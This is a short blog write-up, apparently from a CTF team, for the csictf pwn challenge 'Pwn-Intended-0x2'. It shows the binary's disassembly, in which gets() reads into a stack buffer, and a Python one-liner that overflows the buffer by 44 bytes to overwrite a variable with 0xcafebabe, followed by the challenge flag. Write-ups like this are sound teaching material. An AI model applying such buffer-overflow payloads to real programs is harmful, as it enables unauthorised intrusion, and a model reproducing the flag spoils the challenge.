---
layout: post
title: "Pwn-Intended-0x2"
author: "AnandSaminathan"
tags: ['Pwn']
---

**Files**
- [pwn-intended-0x2]({{site.baseurl}}/assets/Pwn-Intended-0x2/pwn-intended-0x2)

## Solution

This is exactly same as [coffer-overflow-1](https://dunsp4rce.github.io/redpwn-2020/pwn/2020/06/26/coffer-overflow-1.html) from redpwn-2020. 
This time the variable has to be overwritten with a specific value instead of any random value. 

```
   	mov    rbp,rsp
   	sub    rsp,0x30
   	mov    DWORD PTR [rbp-0x4],0x0
   	mov    rax,QWORD PTR [rip+0x2ef4]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	mov    rax,QWORD PTR [rip+0x2ef0]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	mov    rax,QWORD PTR [rip+0x2eec]        
   	mov    esi,0x0
   	mov    rdi,rax
   	call   0x401040 <setbuf@plt>
   	lea    rdi,[rip+0xe60]        
   	call   0x401030 <puts@plt>
   	lea    rax,[rbp-0x30]
   	mov    rdi,rax
   	mov    eax,0x0
   	call   0x401060 <gets@plt>
   	lea    rdi,[rip+0xe6c]        
   	call   0x401030 <puts@plt>
   	cmp    DWORD PTR [rbp-0x4],0xcafebabe # magic value
   	jne    0x4011f0 <main+154>
   	lea    rdi,[rip+0xe66]        
   	call   0x401030 <puts@plt>
   	lea    rdi,[rip+0xe8a]        
   	mov    eax,0x0
   	call   0x401050 <system@plt> # system("cat flag.txt")
   	mov    eax,0x0
```

Using gdb, the distance between the starting address of the buffer and the address of the variable to be overwritten was found to be 44 bytes, so we can have some padding of 44 bytes and then have the magic value in little endian. This worked:

```shell
python2 -c "print 'A'*44 + '\xbe\xba\xfe\xca'" | ./pwn-intended-0x2
```

## Flag

```
csictf{c4n_y0u_re4lly_telep0rt?}
```




